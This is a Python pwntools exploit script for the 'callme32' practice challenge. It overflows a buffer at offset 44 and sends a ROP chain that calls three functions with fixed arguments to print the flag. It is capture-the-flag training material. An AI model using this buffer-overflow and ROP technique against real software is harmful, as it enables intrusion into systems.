#!/usr/bin/python3
from pwn import *
context.binary = 'callme32'
p = process('./callme32')
for i in range(6):
	print(p.recvline(timeout=1).decode('utf-8'))
# using gdb we found the offset to be 44
offset = 44
# create a ROP chain to call
# call the callme_one(), callme_two() and callme_three()
# functions in that order, each with the arguments 0xdeadbeef,
# 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe,
# 0xd00df00d) to print the flag.
r = ROP(context.binary)
r.call(context.binary.sym.plt.callme_one, [0xdeadbeef, 0xcafebabe, 0xd00df00d])
r.call(context.binary.sym.plt.callme_two, [0xdeadbeef, 0xcafebabe, 0xd00df00d])
r.call(context.binary.sym.plt.callme_three, [0xdeadbeef, 0xcafebabe, 0xd00df00d])
# send the ROP chain
p.sendline(fit({44:r.chain()}))
p.interactive()
p.close()
